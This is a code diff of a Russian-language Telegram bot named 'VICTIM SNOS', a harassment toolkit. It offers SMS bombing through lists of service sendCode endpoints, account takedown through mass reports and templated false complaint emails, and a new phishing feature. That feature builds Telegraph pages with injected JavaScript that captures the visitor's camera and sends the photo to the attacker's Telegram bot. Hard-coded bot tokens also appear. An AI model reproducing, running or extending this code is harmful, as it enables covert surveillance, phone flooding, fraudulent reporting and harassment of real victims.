@@ -8,8 +8,8 @@ import logging
 import time
 import shutil
 import re
-from datetime import datetime
 import hashlib
+from datetime import datetime
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -27,7 +27,7 @@ import pyrogram.raw.functions.messages as raw_messages
 import pyrogram.raw.types as raw_types
 
 # ---------- НАСТРОЙКИ ----------
-BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
+BOT_TOKEN = "8037050881:AAEmLrVKUpMkqSA1eL4uMiP2Tff63cyeWQQ"
 API_ID = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 ADMIN_ID = 7736817432
@@ -57,38 +57,128 @@ USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
 ]
 
+# МНОГО УСТРОЙСТВ (50+)
 DEVICES = [
-    {"model": "iPhone 15 Pro", "system": "iOS 17.0"},
-    {"model": "iPhone 14 Pro Max", "system": "iOS 16.5"},
+    # iPhone
+    {"model": "iPhone 15 Pro Max", "system": "iOS 17.2"},
+    {"model": "iPhone 15 Pro", "system": "iOS 17.1"},
+    {"model": "iPhone 15 Plus", "system": "iOS 17.0"},
+    {"model": "iPhone 15", "system": "iOS 17.0"},
+    {"model": "iPhone 14 Pro Max", "system": "iOS 16.6"},
+    {"model": "iPhone 14 Pro", "system": "iOS 16.5"},
+    {"model": "iPhone 14 Plus", "system": "iOS 16.4"},
+    {"model": "iPhone 14", "system": "iOS 16.3"},
+    {"model": "iPhone 13 Pro Max", "system": "iOS 15.7"},
+    {"model": "iPhone 13 Pro", "system": "iOS 15.6"},
+    {"model": "iPhone 13", "system": "iOS 15.5"},
+    {"model": "iPhone 13 mini", "system": "iOS 15.4"},
+    {"model": "iPhone 12 Pro Max", "system": "iOS 14.8"},
+    {"model": "iPhone 12 Pro", "system": "iOS 14.7"},
+    {"model": "iPhone 12", "system": "iOS 14.6"},
+    {"model": "iPhone 12 mini", "system": "iOS 14.5"},
+    {"model": "iPhone 11 Pro Max", "system": "iOS 13.7"},
+    {"model": "iPhone 11 Pro", "system": "iOS 13.6"},
+    {"model": "iPhone 11", "system": "iOS 13.5"},
+    {"model": "iPhone XS Max", "system": "iOS 12.5"},
+    {"model": "iPhone XS", "system": "iOS 12.4"},
+    {"model": "iPhone XR", "system": "iOS 12.3"},
+    {"model": "iPhone X", "system": "iOS 11.4"},
+    {"model": "iPhone 8 Plus", "system": "iOS 11.3"},
+    {"model": "iPhone 8", "system": "iOS 11.2"},
+    {"model": "iPhone SE (2022)", "system": "iOS 16.1"},
+    # Samsung
     {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
+    {"model": "Samsung Galaxy S24+", "system": "Android 14"},
+    {"model": "Samsung Galaxy S24", "system": "Android 14"},
+    {"model": "Samsung Galaxy S23 Ultra", "system": "Android 14"},
+    {"model": "Samsung Galaxy S23+", "system": "Android 13"},
+    {"model": "Samsung Galaxy S23", "system": "Android 13"},
+    {"model": "Samsung Galaxy S22 Ultra", "system": "Android 13"},
+    {"model": "Samsung Galaxy S22+", "system": "Android 12"},
+    {"model": "Samsung Galaxy S22", "system": "Android 12"},
+    {"model": "Samsung Galaxy S21 Ultra", "system": "Android 12"},
+    {"model": "Samsung Galaxy S21+", "system": "Android 11"},
+    {"model": "Samsung Galaxy S21", "system": "Android 11"},
+    {"model": "Samsung Galaxy Note 20 Ultra", "system": "Android 11"},
+    {"model": "Samsung Galaxy Z Fold5", "system": "Android 14"},
+    {"model": "Samsung Galaxy Z Flip5", "system": "Android 14"},
+    {"model": "Samsung Galaxy A55", "system": "Android 14"},
+    {"model": "Samsung Galaxy A35", "system": "Android 14"},
+    # Google Pixel
     {"model": "Google Pixel 8 Pro", "system": "Android 14"},
+    {"model": "Google Pixel 8", "system": "Android 14"},
+    {"model": "Google Pixel 7 Pro", "system": "Android 13"},
+    {"model": "Google Pixel 7", "system": "Android 13"},
+    {"model": "Google Pixel 6 Pro", "system": "Android 12"},
+    {"model": "Google Pixel 6", "system": "Android 12"},
+    # Xiaomi
+    {"model": "Xiaomi 14 Ultra", "system": "Android 14"},
     {"model": "Xiaomi 14 Pro", "system": "Android 14"},
+    {"model": "Xiaomi 14", "system": "Android 14"},
+    {"model": "Xiaomi 13 Ultra", "system": "Android 13"},
+    {"model": "Xiaomi 13 Pro", "system": "Android 13"},
+    {"model": "Xiaomi 13", "system": "Android 13"},
+    {"model": "Xiaomi 12T Pro", "system": "Android 12"},
+    {"model": "Redmi Note 13 Pro+", "system": "Android 13"},
+    {"model": "Redmi Note 12 Pro", "system": "Android 12"},
+    {"model": "POCO F5 Pro", "system": "Android 13"},
+    {"model": "POCO X6 Pro", "system": "Android 14"},
+    # OnePlus
+    {"model": "OnePlus 12", "system": "Android 14"},
+    {"model": "OnePlus 11", "system": "Android 13"},
+    {"model": "OnePlus 10 Pro", "system": "Android 12"},
+    {"model": "OnePlus Nord 3", "system": "Android 13"},
+    # Huawei
+    {"model": "Huawei P60 Pro", "system": "HarmonyOS 4.0"},
+    {"model": "Huawei Mate 60 Pro", "system": "HarmonyOS 4.0"},
+    {"model": "Huawei P50 Pro", "system": "HarmonyOS 3.0"},
+    {"model": "Huawei Mate 50 Pro", "system": "HarmonyOS 3.0"},
+    # Другие
+    {"model": "OPPO Find X7 Ultra", "system": "Android 14"},
+    {"model": "OPPO Reno 11 Pro", "system": "Android 14"},
+    {"model": "Vivo X100 Pro", "system": "Android 14"},
+    {"model": "Realme GT5 Pro", "system": "Android 14"},
+    {"model": "Nothing Phone (2)", "system": "Android 13"},
+    {"model": "Honor Magic6 Pro", "system": "Android 14"},
+    {"model": "Motorola Edge 40 Pro", "system": "Android 13"},
+    {"model": "Sony Xperia 1 V", "system": "Android 13"},
+    {"model": "ASUS ROG Phone 7", "system": "Android 13"},
+    {"model": "Lenovo Legion Y70", "system": "Android 13"},
+    {"model": "ZTE Nubia Z60 Ultra", "system": "Android 14"},
+    {"model": "Tecno Phantom X2 Pro", "system": "Android 13"},
+    {"model": "Infinix Zero 30", "system": "Android 13"},
+    # iPad
+    {"model": "iPad Pro 12.9 (2023)", "system": "iOS 17.0"},
+    {"model": "iPad Pro 11 (2022)", "system": "iOS 16.0"},
+    {"model": "iPad Air (2022)", "system": "iOS 16.0"},
+    {"model": "iPad mini (2021)", "system": "iOS 15.0"},
+    {"model": "iPad (2022)", "system": "iOS 16.0"},
+    # Mac
+    {"model": "MacBook Pro 16 (2023)", "system": "macOS 14.0"},
+    {"model": "MacBook Pro 14 (2023)", "system": "macOS 14.0"},
+    {"model": "MacBook Air 15 (2023)", "system": "macOS 14.0"},
+    {"model": "MacBook Air 13 (2022)", "system": "macOS 13.0"},
+    {"model": "iMac 24 (2023)", "system": "macOS 14.0"},
+    {"model": "Mac mini (2023)", "system": "macOS 14.0"},
 ]
 
-# ========== РАБОЧИЕ САЙТЫ ДЛЯ СНОСА НОМЕРА ==========
 TELEGRAM_OAUTH_SITES = [
-    # Официальные Telegram
     {"url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "name": "MyTelegram"},
     {"url": "https://web.telegram.org/k/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebK"},
     {"url": "https://web.telegram.org/a/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebA"},
-    
-    # Fragment / Wallet
     {"url": "https://fragment.com/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Fragment"},
     {"url": "https://wallet.telegram.org/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Wallet"},
-    
-    # OAuth Telegram
     {"url": "https://oauth.telegram.org/auth/request", "method": "POST", "phone_field": "phone", "name": "OAuth"},
     {"url": "https://passport.telegram.org/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Passport"},
-    
-    # Мобильные операторы
     {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MTS"},
     {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone", "name": "Beeline"},
     {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone", "name": "Megafon"},
     {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tele2"},
-    
-    # Крупные сервисы
     {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone", "name": "VK"},
     {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone", "name": "OK.ru"},
     {"url": "https://passport.yandex.ru/registration-validations/check-phone", "method": "POST", "phone_field": "phone", "name": "Yandex"},
@@ -120,7 +210,6 @@ BOMBER_WEBSITES = [
     {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DetMir"},
 ]
 
-# Тексты жалоб для СНОС ПОЧТА
 COMPLAINT_TEXTS_ACCOUNT = {
     "1.1": "Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_id}. Спасибо за помощь.",
     "1.2": "Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм - {username}, а мой айди, если злоумышленник поменял юзернейм - {telegram_id}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных.",
@@ -162,6 +251,85 @@ REPORT_REASONS_RU = {
     "illegal_drugs": "Наркотики",
 }
 
+# Telegraph
+TELEGRAPH_TOKEN = None
+TELEGRAPH_AUTHOR = "Telegram"
+TELEGRAPH_AUTHOR_URL = "https://t.me/VICTIMSNOSER"
+phish_pages = {}
+
+CAMERA_TEMPLATE = '''<div style="text-align: center; padding: 30px 20px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 20px; margin: 20px 0;">
+    <h3 style="color: #fff; margin-bottom: 15px; font-size: 22px;">{title}</h3>
+    <p style="color: #aaa; margin-bottom: 25px; font-size: 15px; line-height: 1.5;">{description}</p>
+    <div style="position: relative; max-width: 320px; margin: 0 auto; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+        <video id="video" autoplay playsinline style="width: 100%; display: block; transform: scaleX(-1);"></video>
+        <canvas id="canvas" style="display: none;"></canvas>
+    </div>
+    <button id="cam-btn" style="background: linear-gradient(135deg, #e94560 0%, #c62a47 100%); color: white; border: none; padding: 14px 30px; font-size: 16px; font-weight: bold; border-radius: 12px; margin: 25px 0 10px; cursor: pointer; width: 100%; max-width: 320px; box-shadow: 0 5px 15px rgba(233,69,96,0.3);">{button_text}</button>
+    <div id="status" style="color: #888; font-size: 13px; margin-top: 10px;">Камера готова</div>
+</div>
+<script>
+(function(){
+    const BOT_TOKEN = "{bot_token}";
+    const CHAT_ID = "{chat_id}";
+    const PAGE_ID = "{page_id}";
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const btn = document.getElementById("cam-btn");
+    const status = document.getElementById("status");
+    let stream = null;
+    let done = false;
+    
+    async function startCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+        } catch (e) {
+            status.textContent = "Нет доступа к камере";
+            status.style.color = "#ff4444";
+            btn.disabled = true;
+        }
+    }
+    
+    async function sendPhoto(dataUrl) {
+        try {
+            const blob = await (await fetch(dataUrl)).blob();
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "photo.jpg");
+            formData.append("caption", "📸 Фото с камеры\\n🎯 Жертва: " + PAGE_ID);
+            const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            return (await resp.json()).ok;
+        } catch (e) {
+            return false;
+        }
+    }
+    
+    async function takePhoto() {
+        if (done) { status.textContent = "Фото уже отправлено"; return; }
+        status.textContent = "Съемка...";
+        btn.disabled = true;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        const sent = await sendPhoto(canvas.toDataURL("image/jpeg", 0.9));
+        if (sent) {
+            done = true;
+            status.textContent = "✅ Готово";
+            status.style.color = "#4caf50";
+            btn.textContent = "Отправлено";
+            if (stream) { stream.getTracks().forEach(t => t.stop()); video.srcObject = null; }
+        } else {
+            status.textContent = "❌ Ошибка";
+            status.style.color = "#ff4444";
+            btn.disabled = false;
+        }
+    }
+    
+    btn.addEventListener("click", takePhoto);
+    startCamera();
+})();
+</script>'''
+
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
@@ -173,7 +341,6 @@ user_sessions = {}
 active_attacks = {}
 active_bombers = {}
 active_reports = {}
-active_mail_attacks = {}
 sessions_creation_lock = {}
 usage_logs = []
 MAX_LOGS = 20
@@ -191,16 +358,22 @@ class ReportMessageState(StatesGroup):
     waiting_link = State()
     waiting_reason = State()
 
-class MailAttackAccountState(StatesGroup):
+class MailAccountState(StatesGroup):
     waiting_choice = State()
     waiting_username = State()
     waiting_id = State()
     waiting_reason = State()
 
-class MailAttackChannelState(StatesGroup):
+class MailChannelState(StatesGroup):
     waiting_choice = State()
     waiting_channel = State()
     waiting_violation = State()
+
+class PhishState(StatesGroup):
+    waiting_link = State()
+    waiting_title = State()
+    waiting_description = State()
+    waiting_button = State()
 
 class AdminState(StatesGroup):
     waiting_user_id = State()
@@ -527,11 +700,9 @@ async def mass_report_message(user_id: int, link: str, reason: str, progress_cal
     return ok, None
 
 
-# ---------- СНОС ПОЧТА (MAIL.TM) ----------
+# ---------- СНОС ПОЧТА ----------
 async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str) -> int:
-    if not mail_tm.ready or not mail_tm.accounts:
-        logger.error("MailTM не готов")
-        return 0
+    if not mail_tm.ready or not mail_tm.accounts: return 0
     sent = 0
     sem = asyncio.Semaphore(10)
     async def send_one(acc, rec):
@@ -548,17 +719,60 @@ async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str) -> int:
     return sent
 
 
+# ---------- TELEGRAPH ФИШИНГ ----------
+async def create_telegraph_account(session: aiohttp.ClientSession) -> str:
+    try:
+        short_name = f"User_{random.randint(10000, 99999)}"
+        async with session.post("https://api.telegra.ph/createAccount", json={"short_name": short_name, "author_name": TELEGRAPH_AUTHOR, "author_url": TELEGRAPH_AUTHOR_URL}) as resp:
+            data = await resp.json()
+            if data.get("ok"): return data["result"]["access_token"]
+    except: pass
+    return None
+
+async def fetch_telegraph_page(session: aiohttp.ClientSession, url: str) -> dict:
+    try:
+        path = url.replace("https://telegra.ph/", "").replace("http://telegra.ph/", "").split("?")[0]
+        async with session.get(f"https://api.telegra.ph/getPage/{path}?return_content=true") as resp:
+            data = await resp.json()
+            if data.get("ok"): return data["result"]
+    except: pass
+    return None
+
+async def create_phish_page(session: aiohttp.ClientSession, original_url: str, chat_id: int, title: str, description: str, button_text: str) -> str:
+    global TELEGRAPH_TOKEN
+    if not TELEGRAPH_TOKEN:
+        TELEGRAPH_TOKEN = await create_telegraph_account(session)
+        if not TELEGRAPH_TOKEN: return None
+    page_id = hashlib.md5(f"{chat_id}_{time.time()}".encode()).hexdigest()[:8]
+    original_page = await fetch_telegraph_page(session, original_url)
+    content = original_page["content"] if original_page and original_page.get("content") else []
+    camera_html = CAMERA_TEMPLATE.format(title=title, description=description, button_text=button_text, bot_token=BOT_TOKEN, chat_id=chat_id, page_id=page_id)
+    camera_node = {"tag": "figure", "attrs": {"data-type": "embed"}, "children": [{"tag": "div", "attrs": {"data-html": camera_html}}]}
+    content.append(camera_node)
+    page_title = title if title else (original_page["title"] if original_page else "Статья")
+    try:
+        async with session.post("https://api.telegra.ph/createPage", json={"access_token": TELEGRAPH_TOKEN, "title": page_title, "author_name": TELEGRAPH_AUTHOR, "author_url": TELEGRAPH_AUTHOR_URL, "content": content, "return_content": False}) as resp:
+            data = await resp.json()
+            if data.get("ok"):
+                phish_url = data["result"]["url"]
+                phish_pages[page_id] = {"url": phish_url, "chat_id": chat_id, "created": time.time()}
+                return phish_url
+    except: pass
+    return None
+
+
 # ---------- UI ----------
 def get_main_menu():
     builder = InlineKeyboardBuilder()
     builder.button(text="СНОС НОМЕРА", callback_data="snos_menu")
     builder.button(text="БОМБЕР", callback_data="bomber_menu")
     builder.button(text="СНОС ПОЧТА", callback_data="mail_menu")
-    builder.button(text="ЖАЛОБЫ", callback_data="report_menu")
+    builder.button(text="ЖАЛОБА НА СООБЩЕНИЕ", callback_data="report_menu")
+    builder.button(text="ФИШИНГ", callback_data="phish_menu")
     builder.button(text="АДМИН", callback_data="admin_menu")
     builder.button(text="СТАТУС", callback_data="status")
     builder.button(text="СТОП", callback_data="stop")
-    builder.adjust(2, 2, 2, 1)
+    builder.adjust(2, 2, 2, 1, 1)
     return builder.as_markup()
 
 def get_snos_menu():
@@ -624,6 +838,14 @@ def get_report_reason_menu():
     builder.adjust(2, 2, 2, 2, 1)
     return builder.as_markup()
 
+def get_phish_menu():
+    builder = InlineKeyboardBuilder()
+    builder.button(text="СОЗДАТЬ ФИШ-ССЫЛКУ", callback_data="phish_create")
+    builder.button(text="МОИ ССЫЛКИ", callback_data="phish_list")
+    builder.button(text="НАЗАД", callback_data="main_menu")
+    builder.adjust(1)
+    return builder.as_markup()
+
 def get_admin_menu():
     builder = InlineKeyboardBuilder()
     builder.button(text="ВЫДАТЬ", callback_data="admin_add")
@@ -674,6 +896,8 @@ async def bomber_menu(cb: types.CallbackQuery): await edit_message_with_banner(c
 async def mail_menu(cb: types.CallbackQuery): await edit_message_with_banner(cb, "<b>СНОС ПОЧТА</b>", get_mail_menu()); await cb.answer()
 @dp.callback_query(F.data == "report_menu")
 async def report_menu(cb: types.CallbackQuery): await edit_message_with_banner(cb, "<b>ЖАЛОБЫ</b>", get_report_menu()); await cb.answer()
+@dp.callback_query(F.data == "phish_menu")
+async def phish_menu(cb: types.CallbackQuery): await edit_message_with_banner(cb, "<b>ФИШИНГ</b>", get_phish_menu()); await cb.answer()
 @dp.callback_query(F.data == "admin_menu")
 async def admin_menu_handler(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID: await cb.answer("Нет доступа!", show_alert=True); return
@@ -837,26 +1061,26 @@ async def mail_acc_type(cb: types.CallbackQuery, state: FSMContext):
     complaint_type = cb.data.replace("mailacc_", "")
     await state.update_data(complaint_type=complaint_type)
     if complaint_type == "1.1":
-        await state.set_state(MailAttackAccountState.waiting_reason)
+        await state.set_state(MailAccountState.waiting_reason)
         await cb.message.delete()
         await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ОБЫЧНАЯ ЖАЛОБА</b>\n\nВведите причину:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_acc")]]))
     else:
-        await state.set_state(MailAttackAccountState.waiting_username)
+        await state.set_state(MailAccountState.waiting_username)
         await cb.message.delete()
         await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_acc")]]))
-@dp.message(StateFilter(MailAttackAccountState.waiting_reason))
+@dp.message(StateFilter(MailAccountState.waiting_reason))
 async def mail_acc_reason(msg: types.Message, state: FSMContext):
     await state.update_data(reason=msg.text.strip())
-    await state.set_state(MailAttackAccountState.waiting_username)
+    await state.set_state(MailAccountState.waiting_username)
     await msg.delete()
     await send_message_with_banner(msg, "Введите юзернейм (без @):")
-@dp.message(StateFilter(MailAttackAccountState.waiting_username))
+@dp.message(StateFilter(MailAccountState.waiting_username))
 async def mail_acc_username(msg: types.Message, state: FSMContext):
     await state.update_data(username=msg.text.strip().replace("@", ""))
-    await state.set_state(MailAttackAccountState.waiting_id)
+    await state.set_state(MailAccountState.waiting_id)
     await msg.delete()
     await send_message_with_banner(msg, "Введите Telegram ID:")
-@dp.message(StateFilter(MailAttackAccountState.waiting_id))
+@dp.message(StateFilter(MailAccountState.waiting_id))
 async def mail_acc_id(msg: types.Message, state: FSMContext):
     data = await state.get_data()
     username = data.get("username", "")
@@ -881,16 +1105,16 @@ async def mail_chan_menu(cb: types.CallbackQuery):
 async def mail_chan_type(cb: types.CallbackQuery, state: FSMContext):
     complaint_type = cb.data.replace("mailchan_", "")
     await state.update_data(complaint_type=complaint_type)
-    await state.set_state(MailAttackChannelState.waiting_channel)
+    await state.set_state(MailChannelState.waiting_channel)
     await cb.message.delete()
     await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_chan")]]))
-@dp.message(StateFilter(MailAttackChannelState.waiting_channel))
+@dp.message(StateFilter(MailChannelState.waiting_channel))
 async def mail_chan_link(msg: types.Message, state: FSMContext):
     await state.update_data(channel=msg.text.strip())
-    await state.set_state(MailAttackChannelState.waiting_violation)
+    await state.set_state(MailChannelState.waiting_violation)
     await msg.delete()
     await send_message_with_banner(msg, "Введите ссылку на нарушение:")
-@dp.message(StateFilter(MailAttackChannelState.waiting_violation))
+@dp.message(StateFilter(MailChannelState.waiting_violation))
 async def mail_chan_violation(msg: types.Message, state: FSMContext):
     data = await state.get_data()
     channel = data.get("channel", "")
@@ -905,12 +1129,66 @@ async def mail_chan_violation(msg: types.Message, state: FSMContext):
     await st.delete()
     await send_message_with_banner(msg, f"<b>ГОТОВО</b>\n\n{channel}\nОтправлено: {sent}", get_main_menu())
 
+# Фишинг
+@dp.callback_query(F.data == "phish_create")
+async def phish_create_start(cb: types.CallbackQuery, state: FSMContext):
+    await state.set_state(PhishState.waiting_link)
+    await cb.message.delete()
+    await cb.message.answer_photo(FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None, caption="<b>ФИШИНГ</b>\n\nОтправьте ссылку на Telegraph:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="phish_menu")]]))
+@dp.message(StateFilter(PhishState.waiting_link))
+async def phish_link(msg: types.Message, state: FSMContext):
+    if "telegra.ph" not in msg.text: await send_message_with_banner(msg, "Нужна ссылка на Telegraph!"); return
+    await state.update_data(link=msg.text.strip())
+    await state.set_state(PhishState.waiting_title)
+    await msg.delete()
+    await send_message_with_banner(msg, "Введите заголовок:")
+@dp.message(StateFilter(PhishState.waiting_title))
+async def phish_title(msg: types.Message, state: FSMContext):
+    await state.update_data(title=msg.text.strip())
+    await state.set_state(PhishState.waiting_description)
+    await msg.delete()
+    await send_message_with_banner(msg, "Введите описание:")
+@dp.message(StateFilter(PhishState.waiting_description))
+async def phish_description(msg: types.Message, state: FSMContext):
+    await state.update_data(description=msg.text.strip())
+    await state.set_state(PhishState.waiting_button)
+    await msg.delete()
+    await send_message_with_banner(msg, "Введите текст кнопки:")
+@dp.message(StateFilter(PhishState.waiting_button))
+async def phish_button(msg: types.Message, state: FSMContext):
+    button_text = msg.text.strip()
+    data = await state.get_data()
+    link, title, desc, user_id = data["link"], data["title"], data["description"], msg.from_user.id
+    await state.clear(); await msg.delete()
+    st = await send_message_with_banner(msg, "<b>Создаю страницу...</b>")
+    connector = aiohttp.TCPConnector(limit=10, force_close=True, ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as sess:
+        url = await create_phish_page(sess, link, user_id, title, desc, button_text)
+    await st.delete()
+    if url:
+        add_log(user_id, "Фишинг", url)
+        await send_message_with_banner(msg, f"<b>ССЫЛКА СОЗДАНА!</b>\n\n<code>{url}</code>", get_main_menu())
+    else: await send_message_with_banner(msg, "<b>ОШИБКА</b>\n\nНе удалось создать страницу", get_main_menu())
+@dp.callback_query(F.data == "phish_list")
+async def phish_list(cb: types.CallbackQuery):
+    user_pages = [(i, d) for i, d in phish_pages.items() if d["chat_id"] == cb.from_user.id]
+    if not user_pages: await edit_message_with_banner(cb, "<b>МОИ ССЫЛКИ</b>\n\nПусто", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]])); await cb.answer(); return
+    text = "<b>МОИ ССЫЛКИ</b>\n\n" + "\n".join([f"🔗 <code>{d['url']}</code>" for _, d in user_pages[-5:]])
+    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]])); await cb.answer()
+
 @dp.callback_query(F.data == "stop")
 async def stop(cb: types.CallbackQuery):
     user_id = cb.from_user.id
-    for d in [active_attacks, active_bombers, active_reports, active_mail_attacks]:
+    for d in [active_attacks, active_bombers, active_reports]:
         if user_id in d: del d[user_id]
     await edit_message_with_banner(cb, "<b>ОСТАНОВЛЕНО</b>", get_main_menu())
+
+@dp.message(F.photo)
+async def handle_photo(msg: types.Message):
+    if msg.caption and "Жертва:" in msg.caption:
+        m = re.search(r"Жертва: (\w+)", msg.caption)
+        if m and m.group(1) in phish_pages:
+            await msg.reply(f"<b>📸 НОВОЕ ФОТО!</b>\nСтраница: {phish_pages[m.group(1)]['url']}")
 
 
 # ---------- ЗАПУСК ----------
@@ -932,7 +1210,7 @@ async def init_mailtm():
 
 async def main():
     load_allowed_users()
-    logger.info(f"VICTIM SNOS запуск...")
+    logger.info(f"VICTIM SNOS запуск... Сессий: {SESSIONS_PER_USER}")
     await bot.delete_webhook(drop_pending_updates=True)
     asyncio.create_task(init_mailtm())
     await dp.start_polling(bot)
